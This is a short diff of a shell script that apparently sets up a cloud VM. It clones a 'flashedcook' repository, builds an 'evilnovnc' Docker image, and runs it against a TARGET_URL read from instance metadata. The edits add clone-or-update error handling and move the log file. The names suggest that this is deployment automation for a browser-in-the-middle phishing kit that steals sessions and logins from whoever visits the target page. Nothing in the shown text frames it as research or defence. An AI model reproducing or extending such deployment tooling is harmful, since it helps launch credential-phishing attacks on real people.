@@ -113,8 +113,17 @@ fi
 
 # Clone and setup
 cd /home
-git clone https://github.com/therealelyayo/flashedcook.git || true
-cd flashedcook
+if [ -d "flashedcook" ]; then
+    echo "Repository already exists, updating..."
+    cd flashedcook
+    git pull || echo "Warning: Could not update repository"
+else
+    if ! git clone https://github.com/therealelyayo/flashedcook.git; then
+        echo "Error: Failed to clone repository"
+        exit 1
+    fi
+    cd flashedcook
+fi
 
 # Build images
 docker build -f evilnovnc.Dockerfile -t evilnovnc .
@@ -126,7 +135,7 @@ chown -R 103 Downloads
 
 # Run the application
 TARGET_URL=$(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/attributes/TARGET_URL" -H "Metadata-Flavor: Google")
-nohup ./start_auto.sh "${TARGET_URL}" > /var/log/evilnovnc.log 2>&1 &
+nohup ./start_auto.sh "${TARGET_URL}" > /tmp/evilnovnc.log 2>&1 &
 ' || {
     echo -e "${RED}✗ Failed to create VM instance${NC}"
     exit 1
